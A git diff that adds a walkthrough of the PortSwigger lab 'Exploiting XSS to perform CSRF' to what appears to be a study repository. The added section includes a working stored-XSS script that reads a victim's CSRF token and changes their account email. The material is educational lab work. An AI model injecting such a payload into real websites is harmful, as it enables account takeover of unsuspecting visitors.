@@ -480,3 +480,38 @@ Use the credentials to log in as the victim user.
 ![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/d6b30ad8-c9bc-49c5-ad59-7ce407023acb)
 
 ![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/1d988065-e6f9-4342-b68a-ee557f6d06cb)
+
+**Lab: Exploiting XSS to perform CSRF**
+
+This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.
+
+You can log in to your own account using the following credentials: wiener:peter
+
+Log in using the credentials provided. On your user account page, notice the function for updating your email address.
+If you view the source for the page, you'll see the following information:
+You need to issue a POST request to /my-account/change-email, with a parameter called email.
+There's an anti-CSRF token in a hidden input called token.
+This means your exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim's email address.
+Submit the following payload in a blog comment:
+
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+This will make anyone who views the comment issue a POST request to change their email address to test@test.com.
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/a835b9e9-4529-4cff-91dc-dd94710bcbf7)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/ad2560cf-8d6f-4240-ba09-8c18cf208fa6)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/57f42421-6619-4ab2-9220-d20b7e19d177)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/21a01632-599b-4ca5-954b-de20ceab4c28)
